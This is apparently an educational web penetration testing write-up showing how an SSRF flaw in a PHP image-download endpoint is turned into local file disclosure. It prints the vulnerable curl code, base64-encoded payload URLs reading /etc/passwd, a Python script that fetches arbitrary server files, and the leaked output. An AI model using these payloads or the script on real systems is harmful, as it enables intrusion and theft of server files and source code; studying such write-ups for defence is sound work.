# Glimpse At Web Penetration Testing
A web penetration testing example, that I did me and @Edd13Mora in our free time, for beginners to have an idea about websec.

Our target is a PHP web application, which gives you great tools that you can use on XXX and XXX, such as the one that gives you the ability to download a full size profile picture for a specific profile which leads us to write this write-up.

Compiling SSRF and Local File Disclosure, we were able to read the entire source code and get more vulnerabilities like SQL Injection until we got to the admin panel and were able to get the encoded login information.

## **Server-Side Request Forgery (SSRF)**

When we enter our profile name, the app redirects us, to another page with basic profile information like username, number of followers and account bio, and also gives you a download link for a full size profile picture that looks like this:

```
https://XXXXXXXXXX/XXXXXX/[BASE64].jpg
```

With Base64 in the download URL, it actually looks weird, after we decode it we can see that it's actually an Instagram image link, so we assumed the app ignores `.jpg` and just decodes base64 and sends a request to it and returns its content to us.

As we can see here:

```php
if ( !isset( $_GET["url"] ) ){
	exit();
}
$url_encoded = str_replace(".jpg", "", $_GET["url"]);
```

It will check if the parameter `url` exists, in that case `.jpg` will be replaced with nothing after that:

```php
$url = base64_decode( $url_encoded );
```

It will decode it, send the request, and print the response as we can see here:

```php
$data_headers = array();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url ); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HEADERFUNCTION, "header_callback");
curl_setopt($ch, CURLINFO_HEADER_OUT, 	 true);

$resp = curl_exec($ch);

curl_close ($ch);

foreach( $data_headers as $data_header){

	header( $data_header );
}

echo $resp;
```

To exploit this vulnerability, we can simply generate a malicious Base64 encoded string of our host URL in `beeceptor` so that we can check if the application is sending a request to any given URL without any checking, and it would be something like this:

```
https://XXXXXXXXXX/XXXXXX/aHR0cHM6Ly9oaGhoaC5mcmVlLmJlZWNlcHRvci5jb20=.jpg
```

Where `aHR0cHM6Ly9oaGhoaC5mcmVlLmJlZWNlcHRvci5jb20=` is our `beeceptor` URL base64 encoded.

After sending the request with our malicious payload we can see that we got a request in `beeceptor` and VOILA!! a SSRF.

## Local File Disclosure

The application does not perform any additional URL checks, which will allow us to read local files using the file URI schema, which looks like this:

```
file://[PATH]
```

We tried to read the `/etc/passwd/` file to get to know the target more, and were able to do that easily by creating a malicious URL and sending a request to it.

```
https://XXXXXXXXXX/XXXXXX/ZmlsZTovLy9ldGMvcGFzc3dkCg==.jpg // ZmlsZTovLy9ldGMvcGFzc3dkCg== -> file:///etc/passwd
```

The output will be messy in the browser, so we made an exploitation script that automate the whole process for us, and the output will be formatted:

```python
#!/usr/bin/python3
import requests, sys, base64
print(requests.get(f"https://www.XXXXXXXXXX.com/XXXXXX/{base64.b64encode(('file:///'+sys.argv[1]).encode('utf-8')).decode('utf-8')}.jpg").text)
```

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
....
cpanelphppgadmin:x:996:992:phpPgAdmin for cPanel & WHM:/var/cpanel/userhomes/cpanelphppgadmin:/usr/local/cpanel/bin/noshell
cpanelphpmyadmin:x:995:991:phpMyAdmin for cPanel & WHM:/var/cpanel/userhomes/cpanelphpmyadmin:/usr/local/cpanel/bin/noshell
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
cpses:x:994:990::/var/cpanel/cpses:/sbin/nologin
rhtmuczev5qgvzjk:x:1002:1005::/home2/rhtmuczev5qgvzjk:/usr/local/cpanel/bin/noshell
```

Reading the `passwd` file, we were able to tell that the target is hosted with `WHM / CPANEL`, and if you're not familiar with it, you can go ahead and check: [https://cpanel.net/products/](https://cpanel.net/products/), now we know the website won't be in `/var/www/html`, to access the source code and be able to read it we need to know the exact path to the `cpanel` user home path `rhtmuczev5qgvzjk`, luckily we already have `/home2/rhtmuczev5qgvzjk` in `passwd` file so it would be something like `/home2/rhtmuczev5qgvzjk/public_html/`, you can check [https://forums.cpanel.net/threads/home-path-for-user-is-alias.7474/](https://forums.cpanel.net/threads/home-path-for-user-is-alias.7474/) for more information, to be sure we tried read the `index.php` file and as expected we did.

```php
<?php require_once("common/functions.php"); ?>
<!DOCTYPE html>
<html lang="en">
<head>
....
<?php include("common/widgets/footer.php"); ?>

<script type="text/javascript">
        ga('send', 'pageview', '/');
</script>

</body>
</html> 
```

So hoping to get to the server, we've fetched all the source code and we are now ready for a nice code review.

```
WITH THE PERMISSION OF THE WEBSITE OWNER, WE WERE NOT ABLE TO SHARE THIS PART.
```
